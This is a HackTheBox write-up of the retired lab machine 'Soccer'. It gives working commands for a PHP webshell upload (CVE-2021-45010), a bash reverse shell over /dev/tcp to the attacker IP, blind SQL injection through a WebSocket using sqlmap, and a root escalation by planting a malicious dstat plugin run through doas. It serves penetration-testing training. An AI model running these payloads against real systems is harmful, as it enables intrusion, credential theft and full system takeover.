# Soccer — HackTheBox

| Field | Details |
|-------|---------|
| Platform | HackTheBox |
| Machine | Soccer |
| OS | Linux (Ubuntu 20.04) |
| Difficulty | Easy |
| Attacker IP | `10.10.16.36` |
| Target IP | `10.129.79.196` |
| Domain | `soccer.htb`, `soc-player.soccer.htb` |
| Tools Used | Nmap, ffuf, curl, wscat, sqlmap, nc, doas |
| CVEs | CVE-2021-45010 (Tiny File Manager ≤ 2.4.6 authenticated file upload RCE) |
| Date | October 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Reconnaissance](#reconnaissance)
- [Foothold — CVE-2021-45010 via Default Credentials on Tiny File Manager](#foothold--cve-2021-45010-via-default-credentials-on-tiny-file-manager)
- [Internal Enumeration — Discovering the Second vHost](#internal-enumeration--discovering-the-second-vhost)
- [Blind SQL Injection over WebSocket](#blind-sql-injection-over-websocket)
- [Privilege Escalation — doas + dstat Python Plugin Hijack](#privilege-escalation--doas--dstat-python-plugin-hijack)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT\&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|----------|
| 1 | Nmap full TCP sweep + service scan | Ports 22, 80, 9091; HTTP redirects to `soccer.htb` |
| 2 | `/etc/hosts` registration | `soccer.htb` resolves |
| 3 | ffuf directory brute-force | `/tiny` → Tiny File Manager 2.4.3 login panel |
| 4 | Default credentials (`admin:admin@123`) | Authenticated to Tiny File Manager |
| 5 | CVE-2021-45010 — authenticated PHP file upload | `shell.php` uploaded to `/tiny/uploads/`; RCE as `www-data` |
| 6 | Nginx `sites-enabled` enumeration | Discovered `soc-player.soccer.htb` proxied to `localhost:3000` with WebSocket upgrade headers |
| 7 | ffuf on `soc-player.soccer.htb` | `/check` discovered — ticket lookup via WebSocket |
| 8 | Page source review | `ws://soc-player.soccer.htb:9091` sends JSON `{"id": ...}` to backend |
| 9 | wscat blind SQLi confirmation | `{"id":"0 OR 1=1-- -"}` → `Ticket Exists`; `1=2` → `Ticket Doesn't Exist` |
| 10 | sqlmap over WebSocket (`--technique=B`) | Dumped `soccer_db.accounts` → `player:PlayerOftheMatch2022` (cleartext) |
| 11 | SSH as `player` | User flag captured |
| 12 | SUID `doas` + `doas.conf` | `permit nopass player as root cmd /usr/bin/dstat` |
| 13 | Malicious Python plugin written to `/usr/local/share/dstat/` | `dstat_pwn.py` → `os.system("/bin/bash")` |
| 14 | `doas /usr/bin/dstat --pwn` | Root shell; root flag captured |

---

## Reconnaissance

### Nmap — Phase 1: Full TCP Port Sweep

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -Pn --open -p- -T4 10.129.79.196
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail
```

Three ports open. Port 9091 is labelled `xmltec-xmlmail` — Nmap's default fallback for unrecognised services. The real service needs closer inspection.

### Nmap — Phase 2: Service Version Detection

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -Pn -sS -sV -sC -p 22,80,9091 -T4 10.129.79.196 -oA Soccer
```

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     <pre>Cannot GET /</pre>
```

**Key findings:**

| Port | Service | Notes |
|------|---------|-------|
| 80 | nginx 1.18.0 | Redirects to `soccer.htb` — must register in `/etc/hosts` |
| 9091 | Node.js/Express | `Cannot GET /` error + `Content-Security-Policy: default-src 'none'` = Express app; this is the WebSocket surface |

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.79.196 soccer.htb" | sudo tee -a /etc/hosts
```

---

## Foothold — CVE-2021-45010 via Default Credentials on Tiny File Manager

### Step 1 — Directory Discovery

```bash
Hackerpatel007_1@htb[/htb]$ ffuf \
  -u 'http://soccer.htb/FUZZ' \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -e .php,.html,.htm,.txt \
  -mc 200,204,301,302,307,308,401,403,405 \
  -ac -t 80 -timeout 10 -c -r
```

```
index.html    [Status: 200]
tiny          [Status: 200, Size: 11521]
```

`/tiny` reveals a **Tiny File Manager 2.4.3** login panel.

### Step 2 — Default Credentials

Tiny File Manager ships with hardcoded default credentials documented in its public GitHub README:

| Username | Password |
|----------|----------|
| `admin` | `admin@123` |
| `user` | `12345` |

These were never changed. `admin:admin@123` authenticated successfully.

> Default credentials on management panels are one of the most consistent initial access vectors in real assessments. Always check the product README before attempting anything else.

### Step 3 — CVE-2021-45010 PHP Webshell Upload

**CVE-2021-45010** — Tiny File Manager ≤ 2.4.6: authenticated path traversal in the upload handler allows arbitrary PHP files to be written to any directory writable by the web process. The `/tiny/uploads/` directory is writable by `www-data` and web-accessible.

```bash
# Upload shell.php via the Tiny File Manager web UI to /tiny/uploads/
# shell.php content: <?php system($_REQUEST['cmd']); ?>

Hackerpatel007_1@htb[/htb]$ curl "http://soccer.htb/tiny/uploads/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed. Establish reverse shell:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 4444
Hackerpatel007_1@htb[/htb]$ curl "http://soccer.htb/tiny/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.36/4444+0>%261'"
```

```
www-data@soccer:/var/www/html/tiny/uploads$
```

```bash
www-data@soccer:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Internal Enumeration — Discovering the Second vHost

### Step 4 — Nginx Configuration Review

```bash
www-data@soccer:/$ cat /etc/nginx/sites-enabled/soc-player.htb
```

```nginx
server {
    listen 80;
    server_name soc-player.soccer.htb;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
```

**What this reveals:**
- A second vhost `soc-player.soccer.htb` proxies to `localhost:3000` (Node.js app)
- The `Upgrade`/`Connection: upgrade` headers confirm **WebSocket support** — this is the port 9091 surface

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.79.196 soc-player.soccer.htb" | sudo tee -a /etc/hosts
```

---

## Blind SQL Injection over WebSocket

### Step 5 — Discover the Injection Surface

```bash
Hackerpatel007_1@htb[/htb]$ ffuf -u 'http://soc-player.soccer.htb/FUZZ' \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -ac -t 80 -c -r
# Discovers: /login, /signup, /check, /match, /logout
```

Register an account at `/signup`, log in, and navigate to `/check`. The page shows a ticket lookup form. Viewing the page source reveals the WebSocket client:

```javascript
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
// On input, sends: JSON.stringify({"id": msg})
// Server responds: "Ticket Exists" or "Ticket Doesn't Exist"
```

The `id` value is sent directly to a database query with no visible sanitisation — a blind boolean injection surface.

### Step 6 — Manual Confirmation with wscat

```bash
Hackerpatel007_1@htb[/htb]$ wscat -c 'ws://soc-player.soccer.htb:9091/'
> {"id":"0 OR 1=1-- -"}
< Ticket Exists
> {"id":"0 OR 1=2-- -"}
< Ticket Doesn't Exist
```

Boolean differential confirmed — blind SQLi via WebSocket.

### Step 7 — sqlmap over WebSocket

sqlmap natively supports `ws://`. The `*` marker in the JSON body tells sqlmap which field to inject.

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u "ws://soc-player.soccer.htb:9091" \
  --data '{"id": "*"}' \
  --technique=B \
  --dbs \
  --threads 10 --level 5 --risk 3 --batch
```

```
back-end DBMS: MySQL >= 8.0.0
available databases: information_schema, mysql, performance_schema, soccer_db, sys
```

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u "ws://soc-player.soccer.htb:9091" \
  --data '{"id": "*"}' \
  --technique=B \
  -D soccer_db --dump \
  --threads 10 --level 5 --risk 3 --batch
```

```
Database: soccer_db
Table: accounts
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

Password stored in **cleartext** (CWE-256) — a separate finding in a real engagement.

### Step 8 — SSH as player — User Flag

```bash
Hackerpatel007_1@htb[/htb]$ ssh player@10.129.79.196
player@10.129.79.196's password: PlayerOftheMatch2022

player@soccer:~$ cat user.txt
f9e48ac90f48d48f75517c098b9a5035
```

---

## Privilege Escalation — doas + dstat Python Plugin Hijack

### Step 9 — SUID Binary Discovery

```bash
player@soccer:~$ ls -al /usr/local/bin/
-rwsr-xr-x 1 root root 42224 Nov 17  2022 doas
```

`doas` has the SUID bit set. It is an OpenBSD-origin lightweight alternative to `sudo`, configured via `/usr/local/etc/doas.conf`.

### Step 10 — Read doas Policy

```bash
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

| Token | Meaning |
|-------|----------|
| `permit nopass` | No password required |
| `player as root` | Runs as root |
| `cmd /usr/bin/dstat` | Restricted to `dstat` only |

**The flaw:** The rule restricts `player` to `dstat` but does not restrict dstat's arguments. `dstat` loads Python plugin files from `/usr/local/share/dstat/` — and `player` has write access to that directory.

### Step 11 — Verify Writable Plugin Directory

```bash
player@soccer:~$ ls -la /usr/local/share/ | grep dstat
drwxrwxr-x  2 root player 4096 Dec 12  2022 dstat
```

`player` owns the directory and can write Python plugins. Any file named `dstat_<name>.py` here is loadable via `dstat --<name>`.

### Step 12 — Write Malicious Plugin

```bash
player@soccer:~$ echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py

# Verify it's visible
player@soccer:~$ doas /usr/bin/dstat --list | grep pwn
        pwn
```

### Step 13 — Execute Plugin as Root

```bash
player@soccer:~$ doas /usr/bin/dstat --pwn
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated
root@soccer:/home/player# id
uid=0(root) gid=0(root) groups=0(root)

root@soccer:/home/player# cat /root/root.txt
bd1f327021c55405f7c086babd45cd7a
```

---

## Flags

| Flag | Value |
|------|-------|
| User Flag | `f9e48ac90f48d48f75517c098b9a5035` |
| Root Flag | `bd1f327021c55405f7c086babd45cd7a` |

---

## Lessons Learned

1. **Default credentials on management panels are a reliable and consistent initial access vector.** Tiny File Manager ships with `admin:admin@123` in its public README. Always check vendor documentation before any brute force attempt.

2. **CVE-2021-45010 chains trivially after default cred login.** The path traversal in the upload handler elevates an authenticated medium-severity issue to critical when default credentials are present — the authentication requirement becomes meaningless.

3. **WebSocket endpoints are a blind spot in most assessments.** Port 9091 was fingerprinted as `xmltec-xmlmail` — entirely wrong. Express-style `Cannot GET /` errors with `Content-Security-Policy: default-src 'none'` signal Node.js. Always review JavaScript source in authenticated pages for non-HTTP attack surfaces like WebSocket connections.

4. **Blind SQLi over WebSocket is fully exploitable with modern sqlmap.** The `ws://` protocol handler (introduced ~1.6) accepts a JSON body with `*` as the injection marker. The binary `Ticket Exists`/`Ticket Doesn't Exist` differential is identical in logic to HTTP-based boolean injection — the transport doesn't change the exploitability.

5. **Plaintext password storage (CWE-256) is a critical finding distinct from the SQLi.** Had credentials been hashed, database access would have required cracking. Always flag cleartext credential storage separately in real engagements.

6. **Credential reuse between web application and SSH is extremely common.** Always test recovered credentials against all other services immediately.

7. **`doas`/`sudo` rules permitting tools with plugin interfaces are equivalent to unrestricted root access.** `dstat`'s Python plugin loader turns the `cmd /usr/bin/dstat` restriction into a bypass. When any privileged command loads external code (interpreters, plugin-capable utilities, editors), the restriction on the binary name is insufficient. The fix is to also restrict arguments: `args --no-plugins` or equivalent.

8. **Writable plugin directories with a root-privileged loader are an instant root path.** Enumerate `/usr/local/share/`, `/opt/`, and similar directories for writable paths that root processes read interpreted code from.

---

## Full Attack Chain Reference

```
Nmap → ports 22, 80, 9091
/etc/hosts → soccer.htb
ffuf → /tiny → Tiny File Manager 2.4.3
Default creds admin:admin@123 → authenticated
CVE-2021-45010: upload shell.php to /tiny/uploads/
curl shell.php?cmd=id → uid=33(www-data) ✓
nc -lvnp 4444 → bash reverse shell via webshell

cat /etc/nginx/sites-enabled/soc-player.htb
  → soc-player.soccer.htb → localhost:3000 (WebSocket)
/etc/hosts → soc-player.soccer.htb

ffuf → /check
Page source: ws://soc-player.soccer.htb:9091, JSON {"id": ...}

wscat → {"id":"0 OR 1=1-- -"} → Ticket Exists
wscat → {"id":"0 OR 1=2-- -"} → Ticket Doesn't Exist
[Blind boolean SQLi confirmed]

sqlmap -u ws://... --data '{"id": "*"}' --technique=B --dbs
  → soccer_db
sqlmap -D soccer_db --dump
  → player:PlayerOftheMatch2022 (cleartext)

ssh player@10.129.79.196 (reused password)
cat ~/user.txt: f9e48ac90f48d48f75517c098b9a5035

ls /usr/local/bin/doas → SUID set
cat /usr/local/etc/doas.conf
  → permit nopass player as root cmd /usr/bin/dstat
ls -la /usr/local/share/dstat/ → drwxrwxr-x (player write)

echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py
doas /usr/bin/dstat --pwn
  → root@soccer
cat /root/root.txt: bd1f327021c55405f7c086babd45cd7a
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `sudo nmap -Pn --open -p- -T4 <IP>` | Full TCP port sweep |
| `sudo nmap -Pn -sS -sV -sC -p 22,80,9091 -T4 <IP> -oA Soccer` | Service version + script scan |
| `echo "<IP> soccer.htb soc-player.soccer.htb" \| sudo tee -a /etc/hosts` | Register both vhosts |
| `ffuf -u 'http://soccer.htb/FUZZ' -w <wordlist> -e .php,.html -ac -t 80 -c -r` | Web directory brute-force |
| `curl "http://soccer.htb/tiny/uploads/shell.php?cmd=id"` | Verify RCE via uploaded webshell |
| `cat /etc/nginx/sites-enabled/soc-player.htb` | Discover second vhost and WebSocket proxy |
| `wscat -c 'ws://soc-player.soccer.htb:9091/'` | Manual WebSocket interaction for SQLi confirmation |
| `sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --technique=B --dbs --threads 10 --level 5 --risk 3 --batch` | Enumerate databases over WebSocket |
| `sqlmap ... -D soccer_db --dump ...` | Dump `soccer_db.accounts` table |
| `ssh player@<IP>` | SSH with recovered credentials |
| `cat /usr/local/etc/doas.conf` | Read doas privilege policy |
| `ls -la /usr/local/share/dstat/` | Check write permissions on plugin directory |
| `echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py` | Write malicious dstat Python plugin |
| `doas /usr/bin/dstat --pwn` | Execute plugin as root → root shell |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|--------------|
| T1595 | T1595.001 | Nmap full-port + service-version scan |
| T1046 | — | ffuf directory brute-force on both vhosts |
| T1078 | T1078.001 | Login to Tiny File Manager with default credentials `admin:admin@123` |
| T1190 | — | CVE-2021-45010: authenticated path traversal file upload RCE |
| T1505 | T1505.003 | `shell.php` uploaded to web-accessible `/tiny/uploads/` for persistent `www-data` RCE |
| T1083 | — | Nginx `sites-enabled` enumeration reveals `soc-player.soccer.htb` |
| T1190 | — | Blind boolean SQLi via WebSocket JSON body `{"id": "*"}` on `ws://soc-player.soccer.htb:9091` |
| T1552 | T1552.001 | Cleartext password `PlayerOftheMatch2022` recovered from `soccer_db.accounts` |
| T1021 | T1021.004 | SSH lateral movement using database credentials reused as OS account password |
| T1548 | T1548.001 | SUID `doas` binary executes `dstat` as root |
| T1574 | T1574.006 | Malicious `dstat_pwn.py` written to writable `/usr/local/share/dstat/`; loaded and executed as root |

*HackTheBox retired machine — writeup published after official retirement.*
*Penetration Tester role in India | Target: January 2027*
